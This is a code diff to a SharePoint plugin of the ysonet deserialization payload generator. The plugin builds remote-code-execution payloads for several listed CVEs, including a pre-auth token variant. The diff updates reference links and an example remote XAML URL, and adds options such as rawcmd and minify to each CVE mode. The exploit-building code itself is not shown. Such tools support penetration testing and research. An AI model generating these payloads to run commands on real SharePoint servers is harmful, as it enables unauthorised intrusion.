@@ -21,7 +21,7 @@ using ysonet.Helpers;
  *  It currently supports:
  *      CVE-2020-1147: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
  *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
- *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
+ *      CVE-2018-8421: https://soroush.me/downloadable/workflows_rce_upon_compiling_xoml_using_deserialization.pdf
  *      CVE-2025-49704: https://blog.viettelcybersecurity.com/sharepoint-toolshell/
  *      CVE-2025-53770: patch bypass of CVE-2025-49704 (ToolShell)
  *      CVE-2024-38018: https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ (https://x.com/chudyPB/status/1945420677109936582)
@@ -51,7 +51,7 @@ namespace ysonet.Plugins
                 {"cve=", "the CVE reference: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
                 {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
                 {"g|gadget=", "a gadget chain for CVE-2020-1147 (LosFormatter) or CVE-2024-38018 / CVE-2026-50522 (BinaryFormatter). Default: TypeConfuseDelegate ", v => gadget = v },
-                {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
+                {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://example.local/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
                 {"target=", "for CVE-2026-50522: the absolute SharePoint base URL used as the wctx value. Required with --formbody; on the default token output it only fills the delivery comment's wctx example. It is NOT contacted.", v => target = v },
                 {"formbody", "CVE-2026-50522 only: emit the full URL-encoded wa/wctx/wresult form body ready to POST, instead of just the wresult token. Requires --target.", v => formBody = v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Applies to the BinaryFormatter/LosFormatter gadget CVEs. Default: false", v => minify = v != null },
@@ -81,6 +81,11 @@ namespace ysonet.Plugins
         // A public plugin: it is listed everywhere, with or without --display-private.
         public bool IsPrivate() { return false; }
 
+        public List<string> RuntimeVersions()
+        {
+            return new List<string> { RuntimeVersion.Unspecified };
+        }
+
         public OptionSet Options()
         {
             return options;
@@ -97,49 +102,49 @@ namespace ysonet.Plugins
                 new PluginMode {
                     Name = "CVE-2025-49704 (ToolShell)",
                     Description = "ToolPane.aspx DataSet gadget; pick a variant.",
-                    Options = new string[] { "command", "variant" },
+                    Options = new string[] { "command", "rawcmd", "variant", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2025-49704" } },
                 },
                 new PluginMode {
                     Name = "CVE-2025-53770 (ToolShell patch bypass)",
                     Description = "CVE-2025-49704 with the patch bypass; pick a variant.",
-                    Options = new string[] { "command", "variant" },
+                    Options = new string[] { "command", "rawcmd", "variant", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2025-53770" } },
                 },
                 new PluginMode {
                     Name = "CVE-2024-38018",
                     Description = "SPObjectStateFormatter webpart; choose a BinaryFormatter gadget and the SharePoint generation.",
-                    Options = new string[] { "command", "gadget", "spver" },
+                    Options = new string[] { "command", "rawcmd", "gadget", "spver", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2024-38018" } },
                 },
                 new PluginMode {
                     Name = "CVE-2020-1147",
                     Description = "DataSet quicklinks gadget; choose a LosFormatter gadget.",
-                    Options = new string[] { "command", "gadget" },
+                    Options = new string[] { "command", "rawcmd", "gadget", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2020-1147" } },
                 },
                 new PluginMode {
                     Name = "CVE-2019-0604",
                     Description = "XmlSerializer workflow; command or a XAML url (--useurl).",
-                    Options = new string[] { "command", "useurl" },
+                    Options = new string[] { "command", "rawcmd", "useurl", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2019-0604" } },
                 },
                 new PluginMode {
                     Name = "CVE-2018-8421",
                     Description = "Workflow markup; command or a XAML url (--useurl).",
-                    Options = new string[] { "command", "useurl" },
+                    Options = new string[] { "command", "rawcmd", "useurl", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2018-8421" } },
                 },
                 new PluginMode {
                     Name = "CVE-2026-50522",
                     Description = "Pre-auth SharePoint WS-Federation trust endpoint; deflate-only token, no DPAPI/MachineKey secret needed. Default output is the wresult token; enable formbody for the full POST body (needs target).",
-                    Options = new string[] { "command", "target", "gadget", "formbody" },
+                    Options = new string[] { "command", "rawcmd", "target", "gadget", "formbody", "minify", "usesimpletype", "no-comment" },
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2026-50522" } },
                 },
@@ -191,7 +196,7 @@ namespace ysonet.Plugins
                 case "cve-2018-8421":
                     payload = CVE_2018_8421();
                     if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
-                                "https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/" +
+                                "https://soroush.me/downloadable/workflows_rce_upon_compiling_xoml_using_deserialization.pdf" +
                                 "\r\n-->";
 
                     break;
